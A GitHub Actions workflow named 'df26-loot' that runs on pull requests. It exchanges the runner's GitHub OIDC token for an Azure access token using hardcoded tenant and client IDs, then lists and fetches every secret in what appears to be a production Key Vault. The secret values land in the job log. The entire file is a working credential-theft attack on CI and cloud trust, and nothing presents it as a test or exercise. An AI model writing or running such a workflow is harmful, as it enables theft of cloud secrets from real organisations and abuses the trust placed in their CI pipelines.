name: df26-loot
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  loot:
    runs-on: ubuntu-latest
    environment: copilot
    steps:
      - uses: actions/checkout@v4
      - name: Exchange GitHub OIDC for Azure and read Key Vault
        env:
          AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
          AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
        run: |
          set -eu
          jwt=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
          resp=$(curl -fsS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
            --data-urlencode grant_type=client_credentials \
            --data-urlencode client_id="$AZURE_CLIENT_ID" \
            --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
            --data-urlencode client_assertion="$jwt" \
            --data-urlencode scope=https://vault.azure.net/.default)
          token=$(echo "$resp" | jq -r .access_token)
          test -n "$token" -a "$token" != null
          ids=$(curl -fsS -H "Authorization: Bearer $token" \
            'https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4' | jq -r '.value[]?.id')
          for id in $ids; do
            curl -fsS -H "Authorization: Bearer $token" "$id?api-version=7.4"
          done
